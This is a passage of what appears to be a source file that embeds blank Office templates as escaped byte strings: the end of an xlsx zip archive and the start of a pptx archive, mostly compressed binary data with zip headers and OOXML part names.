d\x17\xca\x92\x89\xbeS\x88U\xf2\xb3\xcb\x92d9!\x13Q\x05qef\xc5\x1e\x90\x03\xc2\xfa\xba\x066\xf4\xd9\x1e\xa0\x18B\xddT\x93\xbc\x0c\x18\xdc\xf1\xf8s\x7f\xe7\x194\x88t\x93\xf3O\xed|l2\x9f\xb7=\xd0\xdd\x81m\xb1\xec\xfe3\xf6"\xb5B\xd1/\x1c\x05M\xef\xd9gz\xaay9x\xc3\xc1~\xce\xa3\xd6V\xac%\x8d\xab\xf53\x1f\xb5\x19\\*!\xfd\x07\xce?*BFL\x18\xeb\x03\xb5\xcf\xf7\xa0\xb6"x\xafa\xdb+\x04Q}\xc56\x1eH\x17H[\x1e\x07\xd08\xd9E\x1bL\x9a\x94mX\xf2\xee\xf6\xc2\xdb(\xb8\xf1\xce;\xdd9_\xc8\xd2\xb7\xe9t\xcfi\xecys\xe6\xb2sr\xf1\xcd\xdd\xe7\xf9\x8c\x9d[\xd8\xb1u\xb1\xd3\xf5\x98\x1a\x92\xf6x\x8a\xea\xf6h6\xd4\x18\xc7\x987k\xc5\x17^|\xf0\x00\x1c\xbd\x05\xaf\x10&LI\xfb\xea\xe0!\\!\xc2\x94a_H@\xf2[\xe7\x9a\xad\x1b\x7f\x01\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xc4\x04\x14f\xcf\x02\x00\x00\x91\x06\x00\x00\r\x00\x00\x00xl/styles.xml\xa4U[k\xdb0\x14~\x1f\xec?\x08\xbd\xbb\xbe4\xce\x92`\xbb4M\r\x85\xae\x8c5\x83\xbd*\xb6\xec\x88\xeab$%u6\xf6\xdfwd\xc7\x89K\xc76\xda<D\xe7\x1cI\xdf\xf9\xceE\xc7\xc9U+8\xdaSm\x98\x92)\x0e/\x02\x8c\xa8,T\xc9d\x9d\xe2o\xeb\xdc\x9bad,\x91%\xe1J\xd2\x14\x1f\xa8\xc1W\xd9\xc7\x0f\x89\xb1\x07N\x1f\xb7\x94Z\x04\x10\xd2\xa4xkm\xb3\xf0}Sl\xa9 \xe6B5T\xc2N\xa5\xb4 \x16T]\xfb\xa6\xd1\x94\x94\xc6]\x12\xdc\x8f\x82`\xea\x0b\xc2$\xee\x11\x16\xa2\xf8\x1f\x10A\xf4\xd3\xae\xf1\n%\x1ab\xd9\x86qf\x0f\x1d\x16F\xa2X\xdc\xd5Ri\xb2\xe1@\xb5\r\'\xa4@m8\xd5\x11j\xf5\xe0\xa4\xb3\xbe\xf2#X\xa1\x95Q\x95\xbd\x00\\_U\x15+\xe8k\xbas\x7f\xee\x93\xe2\x8c\x04\xc8oC\nc?\x88^\xc4\xde\xea7"M|M\xf7\xcc\x95\x0fgI\xa5\xa45\xa8P;i\xa1\x98@\xd4\xa5`\xf1$\xd5\xb3\xcc\xdd\x963\xf6\xa7\xb2\xc4\xfc@{\xc2\xc1\x12`?K\n\xc5\x95F\xba\xde\xa48\xcf\x83\xee\xe7\xcc\x92\x08\xda\x1f[3A\rz\xa0\xcf\xe8\xab\x12Dvw\xb6D\x1b\xa8\x7f\x07\x13\x05\x13g\xf3\x1d\x85\xe3b\xc0\x15\xe3\xfcD(r\xbe\xc1\x90%P9K\xb5\xccAAGy}h\xa0f\x12\x9a\xac\x87\xe9\xce\xfd\xe3t\xad\xc9!\x8c\xe2\xd1\x05\xbfs\x98%\x1b\xa5Kh\xeas*\x06S\x96pZY \xaaY\xbdu\xabU\r\xfco\x94\xb5P\xf8,)\x19\xa9\x95$\xdc\x85\xd2\x83\x9c\x04\x08\xa7\xa0\x9c?\xba\xc6\xff^\xbd\xc0n+$w"\x17\xf6\xaeL1<!\x97\x84A\x84@\x8eb\x8f\xd7+\x0e\x7f\x8c\xd6c\xbf\x1b\x16\xb5\xd5\xd1\x19i\x1a~\xb8\xe6\xac\x96\x82\xf6\xdd\x90%dP\xd1Vi\xf6\x03H\xba\x06p\t\xc1n\x06XV8\x1d2\xd2e\xb4\xad\x8e\x1c\x81\xd5(\xf4\x17\x81\x9fB@\xaeSR\xfc\xe0^;\x87\xc6\x1bhlv\x8c[&\xff\x104`\x96\xed9\x8d]\x17Z\xf7r\xbb\x04\x9f\xbc@6KZ\x91\x1d\xb7\xeb\xd3f\x8a\xcf\xf2gZ\xb2\x9d\x98\x9fN}a{e;\x88\x14\x9f\xe5{W\xedp\xea\xe2\xa2\xad\xbd7\xd0\xa2\xb0\xa2\x9df)\xfey\xbb\xfc4_\xdd\xe6\x917\x0b\x963orIco\x1e/W^<\xb9Y\xaeV\xf9<\x88\x82\x9b_\xa3\xf9\xf1\x8e\xe9\xd1\x8d\xbb,\x81w\xb90\x1cf\x8c>\x06{\x0c\xf1\xf1lK\xf1H\xe9\xe9wU\x01\xdac\xee\xf3h\x1a\\\xc7a\xe0\xe5\x97A\xe8M\xa6d\xe6\xcd\xa6\x97\xb1\x97\xc7a\xb4\x9aN\x96\xb7q\x1e\x8f\xb8\xc7o\x9c2\x81\x1f\x86\xfd\xbcr\xe4\xe3\x85\x85i\xc0\x99\x1cj5Thl\x85"\x81\xfa\x97 \xfc\xa1\x12\xfe\xf9[\x92\xfd\x06\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd0\x8c\xb0\x0b|\x00\x00\x00\x81\x00\x00\x00\x14\x00\x00\x00xl/sharedStrings.xml\x0c\xcbA\n\xc20\x10@\xd1\xbd\xe0\x1d\xc2\xecm\xa2\x0b\x11i\xda\x9d\'\xd0\x03\x0c\xcd\xd8\x04\x92I\xc8\x0c\xa2\xb77\xcb\xcf\xe3\xcf\xeb\xb7d\xf3\xa1.\xa9\xb2\x87\xf3\xe4\xc0\x10o5$\xde=\xbc\x9e\x8f\xd3\r\x8c(r\xc0\\\x99<\xfcH`]\x8e\x87YD\xcdxY<D\xd5v\xb7V\xb6H\x05e\xaa\x8dx\xc8\xbb\xf6\x82:\xb2\xefVZ\'\x0c\x12\x89\xb4d{q\xeej\x0b&\x06\xbb\xfc\x01\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00f4\x92\x8fq\x01\x00\x00\x96\x02\x00\x00\x11\x00\x08\x01docProps/core.xml \xa2\x04\x01(\xa0\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x92]O\xc3 \x14\x86\xefM\xfc\x0f\x84{\x06\xed\xa61\xa4\xeb\xe2\xd7\xbc\x99\x1f\xc9\xe6G\xbc#p\xdc\x1a[h\xe0\xcc\xba\x7f/\xed\xb6:\xa3\xf1\x0ex\xdf\xf3\x9c\xf3\x02\xd9\xe4\xb3*\xc9\x07\xf8P8;\xa6\xc9@P\x02V;S\xd8\xe5\x98>.\xa6\xec\x8c\x92\x80\xca\x1aU:\x0bc\xba\x81@\'\xf9\xf1Q\xa6k\xa9\x9d\x87\x07\xefj\xf0X@ \x91d\x83\xd4\xf5\x98\xae\x10k\xc9y\xd0+\xa8T\x18D\x87\x8d\xe2\x9b\xf3\x95\xc2\xb8\xf5K^+\xfd\xae\x96\xc0S!Ny\x05\xa8\x8cB\xc5[ \xab{"\xdd!\x8d\xee\x91\xf5\xda\x97\x1d\xc0h\x0e%T`1\xf0d\x90\xf0o/\x82\xaf\xc2\x9f\x05\x9dr\xe0\xac\n\xdc\xd41\xd3n\xdcC\xb6\xd1[\xb1w\x7f\x86\xa276M3h\x86\xdd\x18q\xfe\x84\xbf\xdc\xce\xe6]TV\xd8\xf6\xae4\xd0<3Zb\x81%\xe4\xe7Z\xbb\xb5E2\x8d\xf1\xc9\x85*[\x9d\xccW\x00H\x18\x8b\x0b\xe71\xe3\xbd\xbb\xad\xd3\x1e\x14:\x9f\xdf(\x84Fm:u\x7f\xd6\xde{\xa9\x02\xde\xc6\'z+\xc0\\l\xf2\xd9\xf5\xdd\xfd\xd3}\xc6\x7f+\x11\xd6e\xde\x12\xc1\x90\x98Bn3\xef\x95\xe7\xe1\xe5\xd5bJ\xf3T$\'L\x9c21\\\x08!G\xa9\x14\'\xafm\xe3\x1f\xf5m\xaa\xedA\xb5k\xff/1\x1d2q\xc6\xd2t\x91\x8cd:\x92\xc9\xe8\x80\xb8\x07\xe4\xdd\xdc?\x7fR\xfe\x05\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00F\x1f\xdc\xd5\x86\x01\x00\x00\x07\x03\x00\x00\x10\x00\x08\x01docProps/app.xml \xa2\x04\x01(\xa0\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9c\x92MO\xe30\x10\x86\xefH\xfb\x1f,\xdf\xa9Sv\x85P\xe5\x18!>\xc4a\xd1Vj\xe0>8\x93\xd6\xc2\xb5#{\x1a\xb5\xfc\xfa\x9d$\xa2\xa4\xec\x9e\xb8\xcd\x97\xdfy\xfc\xda\xfaz\xbf\xf5\xa2\xc3\x94]\x0c\xa5\x9c\xcf\n)0\xd8X\xbb\xb0.\xe5s\xf5p~%E&\x085\xf8\x18\xb0\x94\x07\xcc\xf2\xda\xfc8\xd3\xcb\x14[L\xe40\x0b\x96\x08\xb9\x94\x1b\xa2v\xa1T\xb6\x1b\xdcB\x9eq;p\xa7\x89i\x0b\xc4iZ\xab\xd84\xce\xe2]\xb4\xbb-\x06R\x17Eq\xa9pO\x18j\xac\xcf\xdb\xa3\xa0\x1c\x15\x17\x1d}W\xb4\x8e\xb6\xe7\xcb/\xd5\xa1e`\xa3o\xda\xd6;\x0b\xc4\xb74O\xce\xa6\x98cC\xe2~o\xd1k5mj\xa6[\xa1\xdd%G\x07Sh5M\xf5\xca\x82\xc7[\x166\r\xf8\x8cZ}\x16\xf4#Bo\xda\x12\\\xcaFw\xb4\xe8\xd0RL"\xbbw\xb6\xedB\x8aW\xc8\xd8\xe3\x94\xb2\x83\xe4 \x10c\xf5cc2\xc4\xbe\xcd\x94\xcc\x03\xee\x9c\xf7\xeck\x8d\x82\x17\xda\x1d#\xf2\xe0\xd8\x1c\xc2\xe9\x99i\xec~\x99\xf90\xc0\xc1\xe9`/0\x02q\xe3\x14\xb5r\xc4\xcb\xfe4KH\xf4\x1f\xf2\xf9\x94|`\x18\xb9G\x9c\n^=\x8aq\xe9\x14p\xb8;\xaf\xfa"\xfe\xdb\x85\xb7\xfc\xdcV\xf1\x0e\x08?L<-\xea\xd5\x06\x12\xd6\xec\xfb\xd1\xe4cA?\xb2\x7f\xc9\xf7"\xb7\x1b\x08k\xac?f\xfem\xf4O\xfe2\xfek3\xbf\x9c\x15?\x0b~\xcdIM\xab\xcf\x1fl\xfe\x02\x00\x00\xff\xff\x03\x00PK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00b\xee\x9dh^\x01\x00\x00\x90\x04\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[Content_Types].xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xb5U0#\xf4\x00\x00\x00L\x02\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x97\x03\x00\x00_rels/.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00Kc\xe8\xfb\x9f\x02\x00\x00\x16\x06\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbc\x06\x00\x00xl/workbook.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x81>\x94\x97\xf3\x00\x00\x00\xba\x02\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\t\x00\x00xl/_rels/workbook.xml.relsPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xbf{\x9d3\x18\x02\x00\x00\x07\x04\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbb\x0b\x00\x00xl/worksheets/sheet1.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xc2\x87\xdb\xf2}\x06\x00\x00\xd7\x1b\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x0e\x00\x00xl/theme/theme1.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xc4\x04\x14f\xcf\x02\x00\x00\x91\x06\x00\x00\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb7\x14\x00\x00xl/styles.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd0\x8c\xb0\x0b|\x00\x00\x00\x81\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb1\x17\x00\x00xl/sharedStrings.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00f4\x92\x8fq\x01\x00\x00\x96\x02\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00_\x18\x00\x00docProps/core.xmlPK\x01\x02-\x00\x14\x00\x06\x00\x08\x00\x00\x00!\x00F\x1f\xdc\xd5\x86\x01\x00\x00\x07\x03\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x1b\x00\x00docProps/app.xmlPK\x05\x06\x00\x00\x00\x00\n\x00\n\x00\x80\x02\x00\x00\xc3\x1d\x00\x00\x00\x00',
    'pptx':'PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x82\xa4\x81\xf9\x8c\x01\x00\x00\x98\x08\x00\x00\x13\x00\x08\x02[Content_Types].xml \xa2\x04\x02(\xa0\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xcc\x96\xc9n\xc20\x14E\xf7\x95\xfa\x0f\x91\xb7Ub\xa0\x83\xaa\x8a\xc0\xa2\xc3\xaa\x03R\xe9\x07\xb8\xc9\x0bXul\xcb6\x94\xfc}_\x06PZ\x01\xa1\x85\xa8l"\xbd\xf8\xdd{\x8fc[N\x7f\xb8H\x857\x07c\xb9\x92!\xe9\x06\x1d\xe2\x81\x8cT\xcc\xe5$$o\xe3\x07\xff\x9ax\xd61\x193\xa1$\x84$\x03K\x86\x83\xd3\x93\xfe8\xd3`=TK\x1b\x92\xa9s\xfa\x86R\x1bM!e6P\x1a$\x8e$\xca\xa4\xccai&T\xb3\xe8\x83M\x80\xf6:\x9d+\x1a)\xe9@:\xdf\xe5\x1ed\xd0\xbf\x83\x84\xcd\x84\xf3\xee\x17\xf8\xba$1 ,\xf1n\xcb\xc6<+$Lk\xc1#\xe6p\x9c\xcee\xfc#\xc5\xaf\x12\x02T\x16=v\xca\xb5=\xc3\x06B\xd7&\xe4#\x9b\x03*\xdd\x0b~\x1a\xc3c\xf0F\xcc\xb8g\x96b\x17\xd5\xdaQm\xc0\xa2\xae\xe8\r\xb6;\xadAUI\xc2#\x88U4KQ\x12\xd4\xcdR\xf1\xad\x0cR\xc6\xe5r\x12\x9b`\xac\xc0\x97O\xcc:\\\xc6z\xd1=4Y\xcd{\'\xa6\x8a\xa6\x1d\x8e&\x82\\32J\xdb6\xd6\xa70n"\x98s\xf8l\x85`e\xdcD\xe0\xf0<B\xf9\xdc\x7f\x11\n\x9b\xc6D\xf6.\xe0\xd5e\x02\x0e>\xeb\x9a\xf5N\xbb\xef\x91ej\xe6\xaa=X\x16\xed\xec\xc4\xd2\xfb\xafL\xbd#d:?B\xa6\x8b#d\xba\xfc\'&\x94\x17\xe7\x1foR\x03\xbfgX^\x95\xb9\xda\xd7h\x04\xc6\xf1\xed\xa7j\x95\x88\xd6{O\x1a\xf2[8\x86xM6-\xfe+\x06_\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xf3k\xd1\x85\xf1\x00\x00\x00Q\x02\x00\x00\x0b\x00\x08\x02_rels/.rels \xa2\x04\x02(\xa0\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x92\xcfJ\x031\x10\x87\xef\x82\xef\x10\xe6\xde\x9dm\x05\x11i\xb6\x17\x11z\x13Y\x1f`Hf\xff\xe0n2$\xa3\xb4oo\x14D\x17j\xe9\xc1c&\xbf\xf9\xf2\xcd\x90\xed\xee0O\xe6\x9dS\x1ec\xb0\xb0\xaej0\x1c\\\xf4c\xe8-\xbc\xb4\x8f\xab;0Y)x\x9ab`\x0bG\xce\xb0k\xae\xaf\xb6\xcf<\x91\x96\xa6<\x8c\x92M\xa1\x84laP\x95{\xc4\xec\x06\x9e)WQ8\x94\x9b.\xa6\x99\xb4\x1cS\x8fB\xee\x95z\xc6M]\xdfb\xfa\xcd\x80f\xc14{o!\xed\xfd\r\x98\xf6(|\t;v\xdd\xe8\xf8!\xba\xb7\x99\x83\x9ex\x02\xf9\xa0\x1c<\xfb\x95\xa4\xd2\x9ft,\xd3\x98\x96R\xcfj\xc1G\xf7T\xca\x19I\xa4*h\xc0\xd3F\x9b\xcb\x8d\xfe\x9e\x16gV\xf2\xa4\x84.&>\xef\xf3\x998\'\xb4\xfe\xcf\x15-\x13?6"\x8a\x928\x97\xe2W\xfa[\x08\x17\x1f\xa1\xf9\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd5.\x01\xc6\x02\x00\x00\x00\x0e\x00\x00\x14\x00\x00\x00ppt/presentation.xml\xec\x97\xddj\xdb0\x14\xc7\xef\x07{\x07\xa3\xdb\x91\xda\xf2W\xdc\x10\xa7$\xeb<\x06\x19\x84\xa6{\x00\xd5V\x12SY2\x92\x92&\x1d{\xf7\x1d\xc9v\xe2\xa6\x0c\n\xbb\xf5\x95%\x9d\xa3\xbf\x8e~GXG\xd3\xbbc\xc5\x9c\x03\x95\xaa\x14<E\xf8\xc6C\x0e\xe5\xb9(J\xbeM\xd1\xaf\xc7l\x94 Gi\xc2\x0b\xc2\x04\xa7):Q\x85\xeef\x9f?M\xebI-\xa9\xa2\\\x13\rS\x1d\x90\xe1jBR\xb4\xd3\xba\x9e\xb8\xae\xcaw\xb4"\xeaF\xd4\x94\x83m#dE4t\xe5\xd6-$y\x01\xf9\x8a\xb9\xbe\xe7\xc5nEJ\x8e\xda\xf9\xf2#\xf3\xc5fS\xe6\xf4^\xe4\xfb\n\x96oD$e6\x0e\xb5+k\xd5\xa9\xd5\x1fQ\xeb\xef\xe2mH\x8a\x1c\xe8z\xff\xa4\xa8\xce\x04\xd7\n\xe8\xa0\x19l[\xb1\xe2\'Q\x9a\xca\x1f\xc5R\xe9\xab\x11\xa7,R\xe4\xe3p\x1c&A\x1c\x02;91#`\xc1\xc8\x9dM\xdd\x7fL\x7f\xdbnD\xa2\xb87\xdb\xbf\xcc\xee\xfb\xae_\x9d\xfc\x08\x81E\x18\x07\x9e\x07\xb9\xcbO\xd0\xf3\xe2\xc4\x1bC\xcf5^\\h\xaa>\xe0W\xd0\r\xd93\xfdH\x8fz\xadO\x8c\xce\xa6\xc4\x8c\xadV\xb2m=\xac\xa4\xc3\x889\x16\x1b9\xca\x1el@}\x17v`\xb8\x06\x9f\x8a\xc8e\x8a`\r\xc2\xb6p\xa4\x18r\xc0\xe7\x91<\xad_St\x8b\xc3\xd0,/5\xb3.\x94,\xf9B>\x1b\xb4\x8eI o\xbb`\xda\xc1RpJV{\x9e\xeb\x06\xfd9\n\x05J81:\xcfT\x9aS\x0bI\xb3v%XYd%c\xb6crN\xbf2\xe9\x1c\x08\xac\xa6\x8fM\x06\xae\xbc\xec\xaa\x8e>\xd5\xb0\xfd\x1c\xce\xf7\x97\x8a\x8f\x986\x9edB\xc9\x95\x81\x92\xc6\x90\xab+C\xae.8\x1e\x0c\x0e\xf7\xcc\xa3E\xe3_\xd0\x84\xd1\xd8\x04<\xf0\xb1PZ>\xc1\x85O\x07a\xe0c\xa0\xb4|\xc2\x0b\x1f\x1c\x8cq<\x00\xea\xa8\xb4\x80\xa2\x1e\xa0\xc4Ol\xf4\x03 